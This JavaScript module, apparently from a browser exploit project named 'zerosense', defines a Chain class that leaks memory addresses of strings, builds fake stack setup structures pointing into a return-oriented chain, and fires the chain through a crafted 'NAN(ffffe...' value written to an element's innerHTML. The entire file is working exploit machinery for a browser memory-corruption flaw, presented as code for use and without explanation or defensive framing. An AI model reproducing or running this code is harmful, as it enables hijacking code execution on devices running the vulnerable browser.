/*eslint-disable no-param-reassign */

var Util = require('zerosense/Util');

var trigger = document.body.appendChild(document.createElement("div"));

class Chain {
	
	constructor(cb) {
		this.cb = cb;
		
		this.addrChainStart = null;
	}
	
	///////////////////////////////////////
	// Public: Chain
	///////////////////////////////////////
	
	getChain() {
		return this.cb.getChain();
	}
	
	
	///////////////////////////////////////
	// Public: Data
	///////////////////////////////////////
	
	getData() {
		return this.cb.getData();
	}
	
	getDataOffset(id) {
		return this.cb.getDataOffset(id);
	}
	
	getDataBuffer(id, size) {
		var sizeChars = ((size % 2) !== 0) ? (size / 2 + 1) : (size / 2);
		var str = this.cb.getData().substr(this.cb.getDataOffset(id) / 2, sizeChars);
		return str;
	}
	
	getDataInt32(id) {
		var str = this.cb.getData().substr(this.cb.getDataOffset(id) / 2, 0x4 / 2);
		return Util.getint32(str);
	}
	
	getDataInt64(id) {
		var strHigh = this.cb.getData().substr(this.cb.getDataOffset(id) / 2, 0x4 / 2);
		var strLow = this.cb.getData().substr(this.cb.getDataOffset(id) / 2 + 2, 0x4 / 2);
		return { high: Util.getint32(strHigh), low: Util.getint32(strLow) };
	}
	
	
	///////////////////////////////////////
	// Private: Chain handling
	///////////////////////////////////////
	
	setup2Make(addr) {
		return Util.pad(0x30)
			+ Util.int32(addr);
	}
	
	setup1Make(addr) {		
		return Util.int32(addr);
	}
	
	prepare(arrayLeaker) {	
		var addrData = arrayLeaker.getAddress(this.cb.getData());
		if (addrData === null) {
			throw new Error("Failed to get chain data address.");
		}
		this.cb.updateDataAddress(addrData);
		
		var addrStack = arrayLeaker.getAddress(this.cb.getChain());
		if (addrStack === null) {
			throw new Error("Failed to get chain stack address.");
		}
		var chainStackOffset = 0x4;
		
		var setup2 = this.setup2Make(addrStack + chainStackOffset);
		var addrSetup2 = arrayLeaker.getAddress(setup2);
		if (addrSetup2 === null) {
			throw new Error("Failed to get setup2 address.");
		}
		
		var setup1 = this.setup1Make(addrSetup2);
		var addrSetup1 = arrayLeaker.getAddress(setup1);
		if (addrSetup1 === null) {
			throw new Error("Failed to get setup1 address.");
		}
		
		this.addrChainStart = addrSetup1;
	}
	
	execute() {
		if (this.addrChainStart === null) {
			throw new Error("addrChainStart is null");
		}
		
		trigger.innerHTML = -parseFloat("NAN(ffffe" + this.addrChainStart.toString(16));
	}
	
}

module.exports = Chain;